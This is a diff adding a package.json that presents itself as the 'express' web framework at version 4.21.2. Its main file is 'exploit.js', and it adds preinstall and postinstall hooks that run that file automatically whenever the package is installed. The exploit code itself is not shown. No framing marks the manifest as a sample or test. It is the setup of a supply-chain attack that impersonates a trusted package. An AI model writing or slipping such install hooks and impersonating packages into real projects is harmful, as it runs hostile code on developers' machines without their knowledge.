@@ -1,0 +1,9 @@
+{
+  "name": "express",
+  "version": "4.21.2",
+  "main": "exploit.js",
+  "scripts": {
+    "preinstall": "node exploit.js",
+    "postinstall": "node exploit.js"
+  }
+}
